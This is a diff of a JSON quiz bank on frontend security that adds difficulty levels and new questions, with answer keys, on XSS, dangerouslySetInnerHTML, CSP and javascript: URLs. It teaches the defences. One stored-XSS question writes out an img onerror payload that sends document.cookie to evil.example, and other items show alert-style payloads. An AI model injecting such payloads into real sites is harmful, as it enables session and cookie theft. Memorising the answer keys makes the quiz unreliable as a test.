-              "lang": "ts",
-              "q": "A profile page renders `<a href={user.website}>Website</a>` with a value the user entered. In React 18, what happens if they enter `javascript:alert(document.cookie)`?",
-              "choices": [
-                "React escapes it, so clicking does nothing",
-                "React warns but renders it; the script runs",
-                "The browser refuses to render the link at all",
-                "React rewrites it to `https://javascript:...`"
-              ],
-              "answer": 1,
-              "explain": "Escaping protects text content, not the meaning of a URL. React 18 only warns about `javascript:` URLs, so validate that user links use `http:` or `https:` before rendering."
-            },
-            {
-              "lang": "ts",
-              "q": "What is the safest way to accept a user-provided URL for a link?",
-              "choices": [
-                "Parse with `new URL()`; allow only http(s)",
-                "Strip the substring `javascript:` from the value",
-                "HTML-escape the value before putting it in `href`",
-                "Check that the value starts with `www.`"
-              ],
-              "answer": 0,
-              "explain": "Allow-listing schemes after parsing handles casing, whitespace and encoding tricks. Stripping a substring is a deny-list that variants like `JaVaScRiPt:` or embedded tabs get around."
-            }
-          ]
-        },
-        {
-          "id": "frontend/frontend-security/content-security-policy",
-          "title": "Content Security Policy",
-          "summary": "A response header that limits where scripts and other resources may load from, as a second line against XSS",
-          "variants": [
-            {
-              "lang": null,
-              "q": "A page sends `Content-Security-Policy: script-src 'self'`. An attacker injects `<script>steal()</script>` into the HTML. What happens?",
-              "choices": [
-                "It runs, because it comes from the same origin",
-                "It runs, but it can't make any network requests",
-                "The browser blocks the inline script",
-                "The server rejects the response before sending"
-              ],
-              "answer": 2,
-              "explain": "With `script-src 'self'`, only scripts loaded from the page's own origin run; inline scripts need `'unsafe-inline'`, a nonce or a hash. CSP is enforced by the browser, not the server."
-            },
-            {
-              "lang": null,
-              "q": "A team adds `'unsafe-inline'` to `script-src` because an old analytics snippet broke under their new CSP. What has this done?",
-              "choices": [
-                "Nothing important: it only affects the analytics snippet",
-                "It makes the policy apply only to inline scripts",
-                "It disables CSP for third-party scripts only",
-                "Injected inline scripts can run again"
-              ],
-              "answer": 3,
-              "explain": "Allowing all inline script re-enables the most common XSS payload. Use a nonce or hash for the one snippet, or load it as an external file."
-            }
-          ]
-        },
         {
           "id": "frontend/frontend-security/token-storage",
           "title": "Where to store auth tokens",
           "summary": "Tokens in `localStorage` are readable by any script on the page; `HttpOnly` cookies are not",
+          "level": "easy",
           "variants": [
             {
               "lang": null,
@@ -1011,13 +1159,109 @@
               "answer": 1,
               "explain": "HttpOnly stops scripts from reading the token, so it can't be stolen and reused elsewhere, but the browser still attaches it to requests the injected script makes from the victim's page. XSS stays serious."
             }
-          ],
-          "basic": true
+          ]
+        },
+        {
+          "id": "frontend/frontend-security/xss",
+          "title": "Cross-site scripting (XSS)",
+          "summary": "Attacker-supplied input that ends up running as script in other users' browsers; escape output for where it goes",
+          "level": "easy",
+          "variants": [
+            {
+              "lang": null,
+              "q": "A forum saves posts as typed and inserts them into the page as raw HTML. A user posts `<img src=x onerror=\"fetch('https://evil.example/?c=' + document.cookie)\">`. What happens when others view the post?",
+              "choices": [
+                "Nothing: browsers ignore event handlers inside user content",
+                "Only the poster's own browser runs the code",
+                "The broken image is hidden and the post shows as empty",
+                "The code runs in each viewer's browser as if it came from the forum"
+              ],
+              "answer": 3,
+              "explain": "This is stored XSS: the markup is served as part of the forum's own page, so the browser runs it with the forum's origin. Escaping the text on output, or sanitising any HTML you allow, prevents it."
+            },
+            {
+              "lang": null,
+              "q": "What is the main defence against XSS when showing user-supplied text in a page?",
+              "choices": [
+                "Escaping it for the context where it is inserted",
+                "Encrypting the text before saving it in the database",
+                "Serving the whole site over HTTPS only, with HSTS",
+                "Checking in the browser that the text has no `<script>` tag"
+              ],
+              "answer": 0,
+              "explain": "Output escaping turns `<`, `>` and quotes into harmless entities, so the text is displayed instead of run; React does this for text by default. HTTPS and encryption don't change what the browser executes, and a `<script>` filter misses event-handler attributes."
+            }
+          ]
+        },
+        {
+          "id": "frontend/frontend-security/xss-inner-html",
+          "title": "XSS and dangerouslySetInnerHTML",
+          "summary": "React escapes text it renders, but raw HTML you insert can run attacker scripts",
+          "level": "medium",
+          "variants": [
+            {
+              "lang": "ts",
+              "q": "A user's comment is `<img src=x onerror=alert(1)>`. What happens when it's rendered with `<p>{comment}</p>`?",
+              "choices": [
+                "It shows as text: React escapes strings",
+                "The image tag runs and the alert fires",
+                "React strips the tag and shows nothing",
+                "React throws an error on HTML in strings"
+              ],
+              "answer": 0,
+              "explain": "React treats a string child as text and escapes it, so no element is created. The danger starts when you use `dangerouslySetInnerHTML` or other raw-HTML APIs."
+            },
+            {
+              "lang": "ts",
+              "q": "User-written Markdown is converted to HTML and shown with `dangerouslySetInnerHTML`. What should happen before rendering?",
+              "choices": [
+                "Nothing: Markdown output can't contain raw HTML",
+                "Encode the HTML with `encodeURIComponent` first",
+                "Wrap it in a `<div>` so any scripts are contained",
+                "Sanitize it with an allow-list sanitizer"
+              ],
+              "answer": 3,
+              "explain": "CommonMark allows raw HTML, and many renderers pass it through, so the output can carry event handlers or scripts. An allow-list sanitizer removes them; URL-encoding would just garble the content."
+            }
+          ]
+        },
+        {
+          "id": "frontend/frontend-security/content-security-policy",
+          "title": "Content Security Policy",
+          "summary": "A response header that limits where scripts and other resources may load from, as a second line against XSS",
+          "level": "medium",
+          "variants": [
+            {
+              "lang": null,
+              "q": "A page sends `Content-Security-Policy: script-src 'self'`. An attacker injects `<script>steal()</script>` into the HTML. What happens?",
+              "choices": [
+                "It runs, because it comes from the same origin",
+                "It runs, but it can't make any network requests",
+                "The browser blocks the inline script",
+                "The server rejects the response before sending"
+              ],
+              "answer": 2,
+              "explain": "With `script-src 'self'`, only scripts loaded from the page's own origin run; inline scripts need `'unsafe-inline'`, a nonce or a hash. CSP is enforced by the browser, not the server."
+            },
+            {
+              "lang": null,
+              "q": "A team adds `'unsafe-inline'` to `script-src` because an old analytics snippet broke under their new CSP. What has this done?",
+              "choices": [
+                "Nothing important: it only affects the analytics snippet",
+                "It makes the policy apply only to inline scripts",
+                "It disables CSP for third-party scripts only",
+                "Injected inline scripts can run again"
+              ],
+              "answer": 3,
+              "explain": "Allowing all inline script re-enables the most common XSS payload. Use a nonce or hash for the one snippet, or load it as an external file."
+            }
+          ]
         },
         {
           "id": "frontend/frontend-security/samesite-cookies",
           "title": "SameSite cookies and CSRF",
           "summary": "The `SameSite` cookie attribute controls whether cookies go on cross-site requests, limiting CSRF",
+          "level": "medium",
           "variants": [
             {
               "lang": null,
@@ -1042,6 +1286,38 @@
               ],
               "answer": 2,
               "explain": "`Lax` still sends cookies on top-level `GET` navigations, so state changes on `GET` stay exploitable. Keep `GET` safe and do changes with `POST`, `PUT` or `DELETE`."
+            }
+          ]
+        },
+        {
+          "id": "frontend/frontend-security/javascript-urls",
+          "title": "`javascript:` URLs",
+          "summary": "User-supplied links can carry `javascript:` URLs that run code when clicked; validate the scheme",
+          "level": "hard",
+          "variants": [
+            {
+              "lang": "ts",
+              "q": "A profile page renders `<a href={user.website}>Website</a>` with a value the user entered. In React 18, what happens if they enter `javascript:alert(document.cookie)`?",
+              "choices": [
+                "React escapes it, so clicking does nothing",
+                "React warns but renders it; the script runs",
+                "The browser refuses to render the link at all",
+                "React rewrites it to `https://javascript:...`"
+              ],
+              "answer": 1,
+              "explain": "Escaping protects text content, not the meaning of a URL. React 18 only warns about `javascript:` URLs, so validate that user links use `http:` or `https:` before rendering."
+            },
+            {
+              "lang": "ts",
+              "q": "What is the safest way to accept a user-provided URL for a link?",
+              "choices": [
+                "Parse with `new URL()`; allow only http(s)",
+                "Strip the substring `javascript:` from the value",
+                "HTML-escape the value before putting it in `href`",
+                "Check that the value starts with `www.`"
+              ],
+              "answer": 0,
+              "explain": "Allow-listing schemes after parsing handles casing, whitespace and encoding tricks. Stripping a substring is a deny-list that variants like `JaVaScRiPt:` or embedded tabs get around."
             }
           ]
         }
